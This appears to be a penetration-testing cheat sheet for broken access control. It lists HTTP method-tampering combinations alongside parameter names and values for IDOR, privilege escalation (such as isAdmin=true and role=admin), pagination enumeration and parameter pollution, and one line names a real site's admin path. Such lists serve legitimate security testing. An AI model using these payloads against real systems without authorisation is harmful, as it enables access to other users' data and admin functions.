
# Broken Access Control Methodology 

   GET -> POST, PUT, PATCH, DELETE 

   POST -> GET, PUT, PATCH, DELETE 


## 1. Horizontal IDOR Method Tampering 

URL Horizontal IDOR Method Tampering : 

URL Method Tampering Horizontal IDOR Payloads {
id
user_id
userid
uid
account_id
profile_id
record_id
order_id
session_id
auth
auth_token
access_token
token
}

JSON Horizontal IDOR Method Tampering : 

JSON Method Tampering Horizontal IDOR Payloads {
"id": 
"user_id": 
"userid":
"uid":
"account_id":
"profile_id":
"record_id":
"order_id":
"session_id":
"auth":
"auth_token":
"access_token":
"token":
}


## 2. Vertical IDOR Method Tampering 

URL Vertical IDOR Method Tampering : 

URL Method Tampering Vertical IDOR Payloads {
isAdmin=true 
accessLevel=admin
role=admin
admin=true
allowed-origins=https://zooplus.com/admin
realm_access=admin
}

JSON Vertical IDOR Method Tampering : 

JSON Method Tampering Vertical IDOR Payloads {
"isAdmin": true,
"accessLevel": "admin",
"role": "admin",
"admin": true,
"allowed-origins": "https://zooplus.com/admin",
"realm_access": "admin"
}


## 3. Pagination / Enumeration Method Tampering 

URL Pagination/Enumeration Method Tampering : 

URL Method Tampering Pagination/Enumeration Payloads {
offset=0&limit=100
page=2
page=9999
page=-2
limit=9999
}
 
JSON Pagination/Enumeration Method Tampering : 

JSON Method Tampering Pagination/Enumeration Payloads {
"offset": 0,
"limit": 100,
"page": 2,
"page": 9999,
"page": -2,
"limit" 9999,
}


## 4. Parameter Pollution Method Tampering

URL Parameter Pollution Method Tampering : 

URL Method Tampering Parameter Pollution API Payloads {
id
user_id
userid
uid
account_id
profile_id
record_id
order_id
session_id
auth
auth_token
access_token
token
}


JSON Parameter Pollution Method Tampering : 

JSON Method Tampering Parameter Pollution API Payloads {
"id": 
"user_id": 
"userid":
"uid":
"account_id":
"profile_id":
"record_id":
"order_id":
"session_id":
"auth":
"auth_token":
"access_token":
"token":
}





